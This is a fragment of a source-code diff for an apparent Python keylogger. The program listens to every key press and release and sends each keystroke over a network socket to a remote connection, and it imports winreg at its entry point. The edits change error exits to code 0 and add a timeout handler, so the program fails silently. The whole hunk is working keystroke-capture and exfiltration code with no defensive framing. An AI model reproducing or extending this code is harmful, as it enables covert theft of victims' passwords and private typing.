@@ -12,19 +12,21 @@ def main():
             try:
                 def on_press(keys):
                     keys = str(keys)
-                    s.send((keys + " PRESSED").encode(FORMAT))
+                    s.send((keys + " PRESSED ").encode(FORMAT))
                 def on_release(keys):
                     keys = str(keys)
-                    s.send((keys + " RELEASED").encode(FORMAT))
+                    s.send((keys + " RELEASED ").encode(FORMAT))
                 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                     listener.join()
             
             except ConnectionResetError:
-                exit(1)
+                exit(0)
             except ConnectionRefusedError:
-                exit(1)
+                exit(0)
+            except TimeoutError:
+                exit(0)
             except OSError:
-                exit(1)
+                exit(0)
 
 if __name__ == "__main__":
     import winreg
